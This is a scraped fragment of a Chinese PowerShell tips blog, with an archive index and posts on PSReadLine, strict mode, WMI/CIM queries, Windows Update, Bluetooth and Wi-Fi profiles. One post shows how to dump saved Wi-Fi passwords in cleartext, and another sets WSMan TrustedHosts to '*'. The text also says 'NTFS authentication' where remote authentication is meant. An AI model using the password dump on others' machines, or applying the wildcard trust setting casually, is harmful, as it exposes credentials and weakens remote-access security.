打开 Windows 设置对话框（快速）（第 2 部分） 2021-11-17 改进 PowerShell ISE 的帮助 2021-11-19 四个 PowerShell 关键先决条件 2021-11-23 启用 Active Directory cmdlet 2021-11-25 通过 PowerShell 调用 COVID 服务 2021-11-29 使用 SOAP Webservice 2021 年 12 月 2021-12-01 禁用摄像头 2021-12-03 检测挂起的重启 2021-12-07 修复 PowerShellGet 和 Publish-Module 2021-12-27 Out-GridView 自定义列 2021-12-29 自动化下载联想驱动程序（第 1 部分） 2021-12-31 自动化下载联想驱动程序（第 2 部分） 2022 年2022 年 01 月 2022-01-04 Windows 重启后自动登录 2022-01-06 动态生成 IntelliSense. 2022-01-10 转义 URL 字符串 2022-01-12 安全地转义数据字符串 2022-01-14 转义独立的字符 2022-01-18 决定您的平台 2022-01-20 是否在 Windows PowerShell 中运行（第 1 部分） 2022-01-24 是否在 Windows PowerShell 中运行（第 2 部分） 2022-01-26 测试 URL 是否完整 2022-01-28 识别主 PowerShell 模块位置 2022 年 02 月 2022-02-01 查看所有模块的细节 2022-02-03 打开关闭 Windows 的对话框 2022-02-07 通过 PowerShell 创建日历电子表格 2022-02-09 计算第几周（第 1 部分） 2022-02-11 计算第几周（第 2 部分） 2022-02-15 本地化日期和时间标签（第 1 部分） 2022-02-17 本地化日期和时间标签（第 2 部分） 2022-02-21 奇怪的 Cmdlet：New-TemporaryFile 2022-02-23 检测计划外的关机 2022-02-25 检测电源状态 2022 年 03 月 2022-03-01 通过 PowerShell 休眠或待机 2022-03-03 自定义基于控制台的对话框 2022-03-07 在 Windows 中用 PowerShell 来管理文件共享（第 1 部分） 2022-03-09 在 Windows 中用 PowerShell 来管理文件共享（第 2 部分） 2022-03-11 为文件夹快速打开 PowerShell 2022-03-15 管理 Bitlocker 2022-03-17 复位防火墙策略 2022-03-21 Defender: 清空威胁列表和相关设置 2022-03-23 从 Internet 下载文件 2022-03-23 为《PowerShell 实战》撰序 2022-03-25 在 PowerShell 使用高效的列表 PowerShell 技术互动社区发展状况（2022 年 3 月）","link":"/2022/03/26/blog-index/"},{"title":"PowerShell 技术互动社区发展状况（2022 年 3 月）","text":"至 2022 年 3 月，“PowerShell 技术互动”社区人数已达到 1998 人，十分接近社区最大容量（2000 人），保持 PowerShell 最大中文社区的位置。根据腾讯社交平台的策略，社区人数的上限为 2000 人，我们会尽可能保留机会给活跃用户。 如您遇到 PowerShell 方面的技术问题，或有好的资源希望分享，请加入我们。QQ 群号：271143343。 或者用手机 QQ 扫描二维码：","link":"/2022/03/26/powershell-technology-interactive-community-growth-status/"},{"title":"PowerShell 技能连载 - Update PowerShell’s PSReadLine","text":"Do you know the PSReadLine module? It’s included in PowerShell 5 and 7 by default, and this module is responsible for the convenient color coding in PowerShell consoles, among a number of additional benefits that makes handling code easier. PowerShell loads this module by default in console-based environments (it’s not being used in the PowerShell ISE). To check the current version, run this: PS&gt; try { (Get-Module -Name PSReadLine).Version.ToString() } catch { Write-Warning 'PSReadLine not used in this host' } 2.1.0 The line either returns the current PSReadLine version used by your PowerShell host, or emits a warning that PSReadline isn’t used by your host (i.e. inside the PowerShell ISE host which takes care of color coding internally). You should make sure you are using the latest version of PSReadline. This line would try and update it to the latest version: PS&gt; Update-Module -Name PSReadLine Just in case you can’t update the module because it shipped with Windows, try and freshly install it like so: PS&gt; Install-Module -Name PSReadLine -Scope CurrentUser -Force Make sure you relaunch PowerShell after you have updated PSReadLine to load the latest version. PSReadLine comes with powerful new features such as “predictive IntelliSense” and dynamic help that are explained here: https://devblogs.microsoft.com/powershell/psreadline-2-2-ga/ ReTweet this Tip!","link":"/2022/03/29/update-powershell-s-psreadline/"},{"title":"PowerShell 技能连载 - Using Dynamic Help in PowerShell Console","text":"","link":"/2022/03/31/using-dynamic-help-in-powershell-console/"},{"title":"PowerShell 技能连载 - Using Predictive IntelliSense","text":"Predictive IntelliSense is a new feature in PSReadLine 2.1 and was improved in version 2.2. As such, it is available in all PowerShell consoles starting in PowerShell version 5.1. If you are uncertain whether your PowerShell console is using the latest version of PSReadLine, try this: PS&gt; Update-Module -Name PSReadLine If you can’t update the module because it shipped with Windows, or you are missing privileges, try and freshly install it like so: PS&gt; Install-Module -Name PSReadLine -Scope CurrentUser -Force Next, restart you PowerShell console. The reason why you may not have heard anything about “predictive IntelliSense” is that it is turned off by default. To turn it on, run this: PS&gt; Set-PSReadLineOption -PredictionSource HistoryAndPlugin In Windows PowerShell, you are limited to the option “History” only: PS&gt; Set-PSReadLineOption -PredictionSource History Immediately thereafter, when you type commands in your console, you start seeing shadowed (darker) IntelliSense suggestions while you type. These suggestions are taken primarily from your command history so PowerShell starts suggesting command parameters that you commonly use. The auto-suggestion is an individualized experience, and the actual suggestions depend on your previous PowerShell commands: PS&gt; Get-Service | import-database -Database $db If you don’t like this “real-time” IntelliSense, turn it off again like so: PS&gt; Set-PSReadLineOption -PredictionSource None","link":"/2022/04/04/using-predictive-intellisense/"},{"title":"PowerShell 技能连载 - Automating User Confirmation","text":"Some commands seem to require user input no matter what. While you can try parameters such as -Confirm:$false to get rid of default confirmations, some commands either do not support that parameter, or show their very own user requests. Here is an example: PS&gt; Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All When you run this command (elevated) on Windows 10 or 11, at the end of the process the cmdlet wants to know whether a restart is OK: Do you want to restart the computer to complete this operation now? [Y] Yes [N] No [?] Help (default is &quot;Y&quot;): The cmdlet halts until the user either enters “Y” or “N”. To fully automate cmdlets like this, either take a closer look at its remaining parameters. Often, there are ways to articulate your choice and leave no room for ambiguities that need manual resolution. In the example above, by adding “-NoRestart”, you could deny automatic restarts and then explicitly restart the machine using Restart-Computer. Or, you can pipe user input to a new PowerShell instance. PowerShell takes the input and places it into the keyboard input buffer. Whenever a command requests user input, it is taken from this buffer. Use comma-separated values to submit multiple items of user input to PowerShell. Here is an example illustrating how you can submit a “N” to the command above: PS&gt; &quot;N&quot; | powershell.exe -noprofile -command Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All","link":"/2022/04/06/automating-user-confirmation/"},{"title":"PowerShell 技能连载 - 管理 Wi-Fi 配置文件","text":"在Windows上，你可以使用旧的控制台命令来发现Wi-Fi配置文件： 1PS&gt; netsh wlan show profiles 从这里开始，您甚至可以查看个人配置文件的详细信息，并获得高速缓存的明文密码。然而，所有这些都是基于控制台的，所以它不是面向对象的，需要大量的字符串操作，当概要文件使用特殊字符或您的计算机使用不同的区域设置时，可能会返回意外的信息。 一个更好的方法是使用本地Windows API。在PowerShell图库上有一个可以使用的公共模块。这样安装： 1PS&gt; Install-Module -Name WifiProfileManagement -Scope CurrentUser 其余的都是微不足道的。要转储所有保存的Wi-Fi配置文件（包括名称中有特殊字符的文件），请使用Get-WiFiProfile： 12345678910111213141516171819PS C:\\&gt; Get-WiFiProfileProfileName ConnectionMode Authentication Encryption Password----------- -------------- -------------- ---------- --------HOTSPLOTS_WR_Muehlenberg manual open noneZudar06_Gast auto WPA2PSK AESmanagement auto WPA3SAE AESMagentaWLAN-X5HZ auto WPA3SAE AESAlando-Whg.17 auto WPA2PSK AESinternet-cafe auto WPA2PSK AESTraining manual WPA2PSK AESQSC-Guest auto open noneibisbudget manual open noneLeonardo auto open noneROOMZ-GUEST auto open noneFreewave auto open nonePS Saturday auto WPA2PSK AESWIFIonICE manual open noneAirport Hotel auto WPA2PSK AES 并且，要查看缓存的Wi-Fi密码，只需添加-ClearKey参数。高速缓存的密码现在将以明文形式出现在“密码”列中。 如果您有兴趣直接在您自己的代码中使用此功能，只需查看模块中的源代码即可。它是高度复杂的，但本地的电源外壳。任何正在寻找直接与Wi-Fi子系统对话的原生API方式的人都应该深入研究这些代码。","link":"/2022/04/08/managing-wi-fi-profiles/"},{"title":"PowerShell 技能连载 - More Control with Strict Mode","text":"有时，PowerShell 可能会出现意外行为。例如，当您输入一个不带引号的 IPv4 地址时，PowerShell 能够正常地接受它，但什么也不做。为什么？ 1PS&gt; 1.2.3.4 在这种情况下，激活“严格模式”可能会有好处，当出现问题时会发出更严格的异常： 12345PS&gt; Set-StrictMode -Version LatestPS&gt; 1.2.3.4The property '3.4' cannot be found on this object. Verify that the property exists.At line:1 char:1 启用严格模式后，PowerShell 会这样解释输入“1.2.3.4”：获取到浮点数 1.2，然后查询其中的 “3” 属性和其中的 “4” 属性。当然，这些属性是不存在的。禁用严格模式后，PowerShell 不会抱怨不存在的属性，只会返回“什么也没有”。这就是所发生的事情。 启用严格模式还有助于识别代码中的拼写错误。只需确保您在脚本开发机器上专门启用严格模式即可。永远不要将它添加到生产代码中。严格模式只是脚本开发人员的帮手。一旦脚本完成并移交给其他用户，请不要将开发工具留在其中。 Set-StrictMode 永远不应该放在您的代码中（并且始终以交互方式输入或作为配置文件脚本的一部分）的原因很简单：其他 PowerShell 脚本开发人员可能故意选择依赖松散的异常，并且当您的脚本强制严格模式，它也适用于从那里使用的所有代码（和模块）。在生产中启用严格模式可能会使运行良好的代码突然产生过多的红色异常。","link":"/2022/04/12/more-control-with-strict-mode/"},{"title":"PowerShell 技能连载 - 利用 WMI（第 1 部分）","text":"WMI 是一种用于查询计算机详细信息的 Windows 技术。如果您仍在使用已弃用的 Get-WmiObject cmdlet，则应重新考虑： 1234567PS&gt; Get-WmiObject -Class Win32_BIOSSMBIOSBIOSVersion : 1.9.1Manufacturer : Dell Inc.Name : 1.9.1SerialNumber : 4ZKM0Z2Version : DELL - 20170001 切换到新的 Get-CimInstance cmdlet，它的工作原理非常相似： 1234567PS&gt; Get-CimInstance -ClassName Win32_BIOSSMBIOSBIOSVersion : 1.9.1Manufacturer : Dell Inc.Name : 1.9.1SerialNumber : 4ZKM0Z2Version : DELL - 20170001 Get-CimInstance 的众多优点之一是它的 IntelliSense 支持：要找出可用的类名，只需按 TAB 或（在 ISE 或 VSCode 等图形编辑器中）按 CTRL+空格： 1PS&gt; Get-CimInstance -ClassName Win32_\\# &lt;-press CTRL+SPACE with the cursor after &quot;_&quot; 最开始可能需要重复按几次按键，因为生成 IntelliSense 列表可能需要几秒钟，因此在您第一次按键时，IntelliSense 可能会超时。 Get-CimInstance 相对于 Get-WmiObject 的另一个优势是 Get-CimInstance 在 PowerShell 7 中也可用。 WMI 是一种基于 Windows 的技术。不要期望在 Linux 机器上找到 WMI 类。","link":"/2022/04/14/leveraging-wmi-part-1/"},{"title":"PowerShell 技能连载 - 利用 WMI（第 2 部分）","text":"查询 WMI 类时，一开始可能无法取回所有信息： 123456PS&gt; Get-CimInstance -ClassName Win32_LogicalDiskDeviceID DriveType ProviderName VolumeName Size FreeSpace-------- --------- ------------ ---------- ---- ---------C: 3 OS 1007210721280 227106992128Z: 4 \\\\127.0.0.1\\c$ OS 1007210721280 227106988032 确保加上 Select-Object 以获得完整的信息集： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192PS&gt; Get-CimInstance -ClassName Win32_LogicalDisk | Select-Object -Property *Status :Availability :DeviceID : C:StatusInfo :Caption : C:Description : Local Fixed DiskInstallDate :Name : C:ConfigManagerErrorCode :ConfigManagerUserConfig :CreationClassName : Win32_LogicalDiskErrorCleared :ErrorDescription :LastErrorCode :PNPDeviceID :PowerManagementCapabilities :PowerManagementSupported :SystemCreationClassName : Win32_ComputerSystemSystemName : DELL7390Access : 0BlockSize :ErrorMethodology :NumberOfBlocks :Purpose :FreeSpace : 227111596032Size : 1007210721280Compressed : FalseDriveType : 3FileSystem : NTFSMaximumComponentLength : 255MediaType : 12ProviderName :QuotasDisabled :QuotasIncomplete :QuotasRebuilding :SupportsDiskQuotas : FalseSupportsFileBasedCompression : TrueVolumeDirty :VolumeName : OSVolumeSerialNumber : DAD43A43PSComputerName :CimClass : root/cimv2:Win32_LogicalDiskCimInstanceProperties : {Caption, Description, InstallDate, Name...}CimSystemProperties : Microsoft.Management.Infrastructure.CimSystemPropertiesStatus :Availability :DeviceID : Z:StatusInfo :Caption : Z:Description : Network ConnectionInstallDate :Name : Z:ConfigManagerErrorCode :ConfigManagerUserConfig :CreationClassName : Win32_LogicalDiskErrorCleared :ErrorDescription :LastErrorCode :PNPDeviceID :PowerManagementCapabilities :PowerManagementSupported :SystemCreationClassName : Win32_ComputerSystemSystemName : DELL7390Access : 0BlockSize :ErrorMethodology :NumberOfBlocks :Purpose :FreeSpace : 227111596032Size : 1007210721280Compressed : FalseDriveType : 4FileSystem : NTFSMaximumComponentLength : 255MediaType : 0ProviderName : \\\\127.0.0.1\\c$QuotasDisabled :QuotasIncomplete :QuotasRebuilding :SupportsDiskQuotas : FalseSupportsFileBasedCompression : TrueVolumeDirty :VolumeName : OSVolumeSerialNumber : DAD43A43PSComputerName :CimClass : root/cimv2:Win32_LogicalDiskCimInstanceProperties : {Caption, Description, InstallDate, Name...}CimSystemProperties : Microsoft.Management.Infrastructure.CimSystemProperties 现在您看到了所有属性，并且可以选择真正需要的项目： 123456PS&gt; Get-CimInstance -ClassName Win32_LogicalDisk | Select-Object -Property DeviceId, Description, FreeSpace, FileSystemDeviceId Description FreeSpace FileSystem-------- ----------- --------- ----------C: Local Fixed Disk 227110989824 NTFSZ: Network Connection 227110989824 NTFS","link":"/2022/04/18/leveraging-wmi-part-2/"},{"title":"PowerShell 技能连载 - 利用 WMI（第 3 部分）","text":"新的 Get-CimInstance cmdlet 允许您在本地查询 WMI，并且（有限）支持远程查询：您可以指定 -ComputerName 参数，但不能使用替代凭据。 这是因为 Get-CimInstance 使用单独的网络会话进行远程访问，这为您提供了更多选择。例如，一旦您建立了一个网络会话，您就可以将它用于多个查询。以下是远程查询 WMI 信息的方法——从建立网络会话开始： 1234567891011# establish network session$credential = Get-Credential -Message 'Your logon details'$computername = '127.0.0.1' # one or more comma-separated IP addresses or computer names # note that IP addresses only work with NTFS authentication. # using computer names in AD is more secure (Kerberos)$options = New-CimSessionOption -Protocol Wsman -UICulture en-us # optional$session = New-CimSession -SessionOption $option -Credential $credential -ComputerName $computername# output live session$session 结果是一个或多个会话，每台指定计算机一个： Id : 1 Name : CimSession1 InstanceId : e7790bc5-6b0d-4920-a6b9-d7b9676aae74 ComputerName : 127.0.0.1 Protocol : WSMAN 当您在 Active Directory 之外使用 IP 地址或计算机时，请确保您已在客户端计算机（而不是服务器）上启用了 NTFS 身份验证。以下代码激活 NTFS 身份验证并需要本地管理员权限： 1PS&gt; Set-Item -Path WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force 设置网络会话后，可以将其用于多个 WMI 查询： 12Get-CimInstance -ClassName Win32_BIOS -CimSession $sessionGet-CimInstance -ClassName Win32_StartupCommand -CimSession $session 完成后，永远不要忘记关闭网络会话，这样它就不会在服务器上驻留很长时间： 1Remove-CimSession -CimSession $session","link":"/2022/04/20/leveraging-wmi-part-3/"},{"title":"PowerShell 技能连载 - 利用 WMI（第 4 部分）","text":"成功利用 WMI 的秘诀是知道代表您需求的类名。在上一个技能中，我们解释了如何使用 IntelliSense 向 Get-CimInstance 询问可用的类名。不过，您也可以以编程方式执行相同的操作。下面是转储默认命名空间 root\\cimv2 的所有有效 WMI 类名称的代码： 1Get-CimClass | Select-Object -ExpandProperty CimClassName | Sort-Object 要检查给定的类名是否真的代表您要查找的内容，请执行一下测试查询。例如，要获取 Win32_OperatingSystem 的所有实例，请运行以下命令： 12345PS&gt; Get-CimInstance -ClassName Win32_OperatingSystemSystemDirectory Organization BuildNumber RegisteredUser SerialNumber Version--------------- ------------ ----------- -------------- ------------ -------C:\\WINDOWS\\system32 psconf.eu 19042 Zumsel 12345-12345-12345-AAOEM 10.0.19042 一些 WMI 类名是显而易见的，但其他则不是。要查看在任何给定类名中找到的属性，请尝试以下操作： 123456Get-CimClass | Select-Object -Property CimClassName, @{ N='Properties' E={$_.CimClassProperties -join ','} } | Out-GridView -PassThru 结果是一个显示 WMI 类名称及其属性名称的网格视图窗口。现在您可以使用网格视图窗口顶部的文本框过滤器来过滤任何关键字。仅列出在 WMI 类名称或其属性之一中包含您的关键字的行。 选择您感兴趣的类，然后单击左下角的“确定”将信息输出到控制台。接下来，您可以使用 Get-CimInstance 来测试查询您找到的 WMI 类名称。","link":"/2022/04/22/leveraging-wmi-part-4/"},{"title":"PowerShell 技能连载 - 利用 WMI（第 5 部分）","text":"WMI 类被组织在所谓的命名空间中，这些命名空间从“根”开始并像目录结构一样工作。默认命名空间是 root\\cimv2，当不指定命名空间时，你只能看到位于默认命名空间中的 WMI 类。这是我们在本系列的过去部分中一直使用的。 还有更多带有许多附加 WMI 类的命名空间，其中一些非常有用。在我们探索 WMI 的这一部分之前，请注意，您将进入 Windows 的文档稀少的区域，这些区域不一定适用于一般受众。您可能需要 google，此处找到的类可能仅适用于特定的 Windows 操作系统和/或许可证类型。 要获取计算机上可用的 WMI 命名空间列表，请运行以下代码： 123456789101112131415161718192021222324# create a new queue$namespaces = [System.Collections.Queue]::new()# add an initial namespace to the queue# any namespace in the queue will later be processed$namespaces.Enqueue('root')# process all elements on the queue until all are takenWhile ($namespaces.Count -gt 0 -and ($current = $namespaces.Dequeue())){ # find child namespaces Get-CimInstance -Namespace $current -ClassName __Namespace -ErrorAction Ignore | # ignore localization namespaces Where-Object Name -NotMatch '^ms_\\d{2}' | ForEach-Object { # construct the full namespace name $childnamespace = '{0}\\{1}' -f $current, $_.Name # add namespace to queue $namespaces.Enqueue($childnamespace) } # output current namespace $current} 代码可能会运行一段时间，所以请喝杯咖啡。结果是您机器上可用的命名空间列表，可能类似于以下内容： root root\\subscription root\\DEFAULT root\\CIMV2 root\\msdtc root\\Cli root\\Intel_ME root\\SECURITY root\\HyperVCluster root\\SecurityCenter2 root\\RSOP root\\PEH root\\StandardCimv2 root\\WMI root\\MSPS root\\directory root\\Policy root\\virtualization root\\Interop root\\Hardware root\\ServiceModel root\\SecurityCenter root\\Microsoft root\\Appv root\\dcim root\\CIMV2\\mdm root\\CIMV2\\Security root\\CIMV2\\power root\\CIMV2\\TerminalServices root\\HyperVCluster\\v2 root\\RSOP\\User root\\RSOP\\Computer root\\StandardCimv2\\embedded root\\directory\\LDAP root\\virtualization\\v2 root\\Microsoft\\HomeNet root\\Microsoft\\protectionManagement root\\Microsoft\\Windows root\\Microsoft\\SecurityClient root\\Microsoft\\Uev root\\dcim\\sysman root\\CIMV2\\mdm\\dmmap root\\CIMV2\\Security\\MicrosoftTpm root\\CIMV2\\Security\\MicrosoftVolumeEncryption root\\Microsoft\\Windows\\RemoteAccess root\\Microsoft\\Windows\\Dns root\\Microsoft\\Windows\\Powershellv3 root\\Microsoft\\Windows\\Hgs root\\Microsoft\\Windows\\WindowsUpdate root\\Microsoft\\Windows\\DeviceGuard root\\Microsoft\\Windows\\TaskScheduler root\\Microsoft\\Windows\\DesiredStateConfigurationProxy root\\Microsoft\\Windows\\SmbWitness root\\Microsoft\\Windows\\Wdac root\\Microsoft\\Windows\\StorageReplica root\\Microsoft\\Windows\\winrm root\\Microsoft\\Windows\\AppBackgroundTask root\\Microsoft\\Windows\\DHCP root\\Microsoft\\Windows\\PS_MMAgent root\\Microsoft\\Windows\\Storage root\\Microsoft\\Windows\\HardwareManagement root\\Microsoft\\Windows\\SMB root\\Microsoft\\Windows\\EventTracingManagement root\\Microsoft\\Windows\\DesiredStateConfiguration root\\Microsoft\\Windows\\Attestation root\\Microsoft\\Windows\\CI root\\Microsoft\\Windows\\dfsn root\\Microsoft\\Windows\\DeliveryOptimization root\\Microsoft\\Windows\\Defender root\\dcim\\sysman\\biosattributes root\\dcim\\sysman\\wmisecurity root\\Microsoft\\Windows\\RemoteAccess\\Client root\\Microsoft\\Windows\\Storage\\PT root\\Microsoft\\Windows\\Storage\\Providers_v2 root\\Microsoft\\Windows\\Storage\\PT\\Alt 一旦您知道了命名空间的名称，就可以使用这个迷你系列的前面部分来查询位于给定命名空间中的 WMI 类名。例如，下面的代码列出了命名空间 “root\\Microsoft\\Windows\\WindowsUpdate” 中的所有 WMI 类： 1234$ns = 'root\\Microsoft\\Windows\\WindowsUpdate'Get-CimClass -Namespace $ns | Select-Object -ExpandProperty CimClassName | Sort-Object 以双下划线开头的类名用于内部用途： __AbsoluteTimerInstruction __ACE __AggregateEvent __ClassCreationEvent __ClassDeletionEvent __ClassModificationEvent __ClassOperationEvent __ClassProviderRegistration __ConsumerFailureEvent __Event __EventConsumer __EventConsumerProviderRegistration __EventDroppedEvent __EventFilter __EventGenerator __EventProviderRegistration __EventQueueOverflowEvent __ExtendedStatus __ExtrinsicEvent __FilterToConsumerBinding __IndicationRelated __InstanceCreationEvent __InstanceDeletionEvent __InstanceModificationEvent __InstanceOperationEvent __InstanceProviderRegistration __IntervalTimerInstruction __MethodInvocationEvent __MethodProviderRegistration __NAMESPACE __NamespaceCreationEvent __NamespaceDeletionEvent __NamespaceModificationEvent __NamespaceOperationEvent __NotifyStatus __NTLMUser9X __ObjectProviderRegistration __PARAMETERS __PropertyProviderRegistration __Provider __ProviderRegistration __QOSFailureEvent __SecurityDescriptor __SecurityRelatedClass __SystemClass __SystemEvent __SystemSecurity __thisNAMESPACE __TimerEvent __TimerInstruction __TimerNextFiring __Trustee __Win32Provider CIM_ClassCreation CIM_ClassDeletion CIM_ClassIndication CIM_ClassModification CIM_Error CIM_Indication CIM_InstCreation CIM_InstDeletion CIM_InstIndication CIM_InstModification MSFT_ExtendedStatus MSFT_WmiError MSFT_WUOperations MSFT_WUSettings MSFT_WUUpdate 要查询此命名空间中的 MSFT_WUSettings 类（如果存在于您的机器上），请运行以下命令： 12$ns = 'root\\Microsoft\\Windows\\WindowsUpdate'Get-CimInstance -ClassName MSFT_WUSettings -Namespace $ns 结果是一个异常，表明您在探索新的且文档稀少的内部 WMI 类时可能会感到意外。根据您的操作系统和许可证类型，可能支持也可能不支持操作。如果它们不受支持，您最终可能会遇到 “provider failure” 异常。 此外，某些 WMI 类（如此命名空间中的类）并非旨在包含属性和返回信息。相反，它们包含方法（命令），这个例子用于管理 Windows 更新： 123$ns = 'root\\Microsoft\\Windows\\WindowsUpdate'Get-CimClass -Namespace $ns -ClassName 'MSFT_WUOperations' | Select-Object -ExpandProperty CimClassMethods 结果显示了它的方法： Name ReturnType Parameters Qualifiers ---- ---------- ---------- ---------- ScanForUpdates UInt32 {SearchCriteria, Updates} {implemented, static} InstallUpdates UInt32 {DownloadOnly, Updates, RebootRequired} {implemented, static} 这是 Windows Server 2019 机器的实际示例。该脚本远程访问服务器（并行）并使用本地 WMI 检查安全更新，然后安装它们： 123456789101112131415161718# list of names of Windows Server 2019 machines to update:$servers=&quot;Server2019-IIS&quot;,&quot;Server2019-AD&quot;$ns = &quot;root/Microsoft/Windows/WindowsUpdate&quot;$class = &quot;MSFT_WUOperations&quot;Invoke-Command -ComputerName $servers -ScriptBlock { # find missing updates: $arg = @{SearchCriteria=&quot;IsInstalled=0 AND AutoSelectOnWebSites=1&quot;} $r = Invoke-CimMethod -Namespace $ns -ClassName $class -MethodName ScanForUpdates -Arguments $arg # install missing updates: if ($r.Updates) { $arg = @{Updates=$r.Updates} Invoke-CimMethod -Namespace $ns -ClassName $class -MethodName InstallUpdates -Arguments $arg }} 请注意，上面的代码在 Windows Server 2019 上有效，但在 Windows Server 2016 上失败（因为 WMI 类名略有变化）。如果你还想深入挖掘，我们强烈推荐 https://github.com/microsoft/MSLab/blob/master/Scenarios/Windows%20Update/readme.md 这是一组关于如何使用 WMI 管理 Windows 服务器上的 Windows 更新的丰富示例。 如果您对 WMI 感兴趣，请前往 https://powershell.one/wmi/commands 了解更多信息。","link":"/2022/04/26/leveraging-wmi-part-5/"},{"title":"PowerShell 技能连载 - 2022 年的 PowerShell 计划","text":"Microsoft PowerShell 团队刚刚发布了 2022 年的计划和投资：https://devblogs.microsoft.com/powershell/powershell-and-openssh-team-investments-for-2022/ 简而言之，这些投资围绕着更高的安全性。此外，自定义远程连接可能会成为一个有趣的补充：您为访问远程系统而编写的代码随后可以被其他 cmdlet 使用，实质上形成了一个远程基础架构。 此外，该团队希望让现有的 Windows PowerShell 用户更容易获得 PowerShell 7。我们可能会在 2022 年看到 Windows PowerShell 多年来的第一次更新：团队讨论向 Windows PowerShell 添加一个新的 cmdlet，以在其上安装 PowerShell 7。 为了让 IntelliSense 更加智能，该团队已经引入了 “CompleterPredictors”，它可以“猜测”你将要输入的内容。虽然这些最初仅限于 Azure cmdlet，但该技术现在将向任何开发人员广泛开放。 通过添加为每个模块单独加载 .NET 程序集的方法，模块将变得更加健壮。目前，当一个模块加载具有给定版本的 .NET 程序集，而另一个模块需要不同版本的相同 .NET 程序集时，任何时候都只能加载一个版本，从而导致失败。 PowerShell 的内部包管理系统 PowerShellGet 将升级到 3.0 版，该版本之前仅作为预览版提供。它解决了从 powershellgallery.com 等存储库上传和安装模块的常见功能请求。 团队在 2022 年将关注更多感兴趣的领域，即适用于 Windows 的 OpenSSH。在此处阅读完整的声明：https://devblogs.microsoft.com/powershell/powershell-and-openssh-team-investments-for-2022/","link":"/2022/04/28/powershell-plans-for-2022/"},{"title":"PowerShell 技能连载 - 管理蓝牙设备（第 1 部分）","text":"列出计算机已连接的蓝牙设备只需要一行代码： 123456789101112131415161718192021222324252627282930PS&gt; Get-PnpDevice -Class BluetoothStatus Class FriendlyName InstanceId------ ----- ------------ ----------OK Bluetooth Bose QC35 II Avrcp Transport BTHENUM\\{0000110C-00...OK Bluetooth Generic Attribute Profile BTHLEDEVICE\\{0000180...OK Bluetooth Generic Access Profile BTHLEDEVICE\\{0000180...OK Bluetooth Generic Attribute Profile BTHLEDEVICE\\{0000180...OK Bluetooth Bamboo Ink Plus BTHLE\\DEV_006FF2E608...OK Bluetooth Bose QC35 II Avrcp Transport BTHENUM\\{0000110E-00...OK Bluetooth Generic Attribute Profile BTHLEDEVICE\\{0000180...OK Bluetooth SMA001d SN: 2110109033 SN2110109033 BTHENUM\\DEV_0080251B...OK Bluetooth MX Master 3 BTHLE\\DEV_D304DEE615...OK Bluetooth Bluetooth LE Generic Attribute Service BTHLEDEVICE\\{0000FE5...OK Bluetooth Microsoft Bluetooth LE Enumerator BTH\\MS_BTHLE\\6&amp;1B2C8...OK Bluetooth Device Information Service BTHLEDEVICE\\{0000180...OK Bluetooth Bluetooth LE Generic Attribute Service BTHLEDEVICE\\{0000180...OK Bluetooth Device Information Service BTHLEDEVICE\\{0000180...OK Bluetooth Generic Access Profile BTHLEDEVICE\\{0000180...OK Bluetooth Bluetooth LE Generic Attribute Service BTHLEDEVICE\\{0001000...OK Bluetooth Bluetooth LE Generic Attribute Service BTHLEDEVICE\\{0000180...OK Bluetooth MX Keys BTHLE\\DEV_D9FDB81EAB...OK Bluetooth Device Information Service BTHLEDEVICE\\{0000180...OK Bluetooth Microsoft Bluetooth Enumerator BTH\\MS_BTHBRB\\6&amp;1B2C...OK Bluetooth Generic Access Profile BTHLEDEVICE\\{0000180...OK Bluetooth Bluetooth LE Generic Attribute Service BTHLEDEVICE\\{0001000...OK Bluetooth Intel(R) Wireless Bluetooth(R) USB\\VID_8087&amp;PID_002...OK Bluetooth Bluetooth Device (RFCOMM Protocol TDI) BTH\\MS_RFCOMM\\6&amp;1B2C...OK Bluetooth Bluetooth LE Generic Attribute Service BTHLEDEVICE\\{0000180...OK Bluetooth Bose QC35 II BTHENUM\\DEV_2811A579... 要根据名称搜索特定的蓝牙设备，请尝试下面一行代码。它会查找名称中带有 “Bose” 的所有设备： 1234567PS&gt; Get-PnpDevice -Class Bluetooth -FriendlyName *Bose*Status Class FriendlyName------ ----- ------------OK Bluetooth Bose QC35 II Avrcp TransportOK Bluetooth Bose QC35 II Avrcp TransportOK Bluetooth Bose QC35 II 通过添加 Select-Object，您还可以显示蓝牙设备的其他详细信息： 12345678910111213141516171819202122232425262728293031PS&gt; Get-PnpDevice -Class Bluetooth | Select-Object -Property Caption, Manufacturer, ServiceCaption Manufacturer Service------- ------------ -------Bose QC35 II Avrcp Transport Microsoft Microsoft_Bluetooth_AvrcpTransportGeneric Attribute Profile Microsoft UmPassGeneric Access Profile Microsoft UmPassGeneric Attribute Profile Microsoft UmPassBamboo Ink Plus Microsoft BthLEEnumBose QC35 II Avrcp Transport Microsoft Microsoft_Bluetooth_AvrcpTransportGeneric Attribute Profile Microsoft UmPassSMA001d SN: 2110109033 SN2110109033 MicrosoftMX Master 3 Microsoft BthLEEnumBluetooth LE Generic Attribute Service Microsoft UmPassMicrosoft Bluetooth LE Enumerator Microsoft BthLEEnumDevice Information Service Microsoft UmPassBluetooth LE Generic Attribute Service Microsoft UmPassDevice Information Service Microsoft UmPassGeneric Access Profile Microsoft UmPassBluetooth LE Generic Attribute Service Microsoft UmPassBluetooth LE Generic Attribute Service Microsoft UmPassMX Keys Microsoft BthLEEnumDevice Information Service Microsoft UmPassMicrosoft Bluetooth Enumerator Microsoft BthEnumGeneric Access Profile Microsoft UmPassBluetooth LE Generic Attribute Service Microsoft UmPassIntel(R) Wireless Bluetooth(R) Intel Corporation BTHUSBBluetooth Device (RFCOMM Protocol TDI) Microsoft RFCOMMBluetooth LE Generic Attribute Service Microsoft UmPassBose QC35 II Microsoft 当您使用名词 “PnPDevice” 搜索其他 cmdlet 时，还可以发现启用或禁用的命令： 1234567PS&gt; Get-Command -Noun PnPDeviceCommandType Name Version Source----------- ---- ------- ------Function Disable-PnpDevice 1.0.0.0 PnpDeviceFunction Enable-PnpDevice 1.0.0.0 PnpDeviceFunction Get-PnpDevice 1.0.0.0 PnpDevice 要了解如何确定当前连接状态并完全删除蓝牙设备，请参阅我们的下一个提示。","link":"/2022/05/02/managing-bluetooth-devices-part-1/"},{"title":"PowerShell 技能连载 - 管理蓝牙设备（第 2 部分）","text":"如果您只是在 Windows 中寻找一种快速的方法来配对和接触配对蓝牙设备，请尝试以下命令： 